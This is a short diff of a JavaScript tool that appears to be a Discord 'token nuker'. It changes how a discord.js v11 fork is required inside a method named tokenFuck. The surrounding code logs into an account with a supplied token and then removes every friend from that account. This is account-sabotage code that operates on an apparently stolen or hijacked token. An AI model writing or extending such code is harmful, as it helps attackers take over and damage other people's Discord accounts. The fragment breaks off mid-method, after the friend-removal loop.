@@ -47,7 +47,8 @@ class Eraxus {
         else return console.log(Color.InitGradient("blue", 'magenta')("This Token Is Valid !"))
     }
     tokenFuck() {
-        var Client = new require("v11-discord.js").Client()
+        var d = new require("v11-discord.js")
+        var Client = d.Client()
         Client.login(this.token)
         Client.on("ready", () => {
             Client.user.friends.forEach(r => Client.user.removeFriend(r))
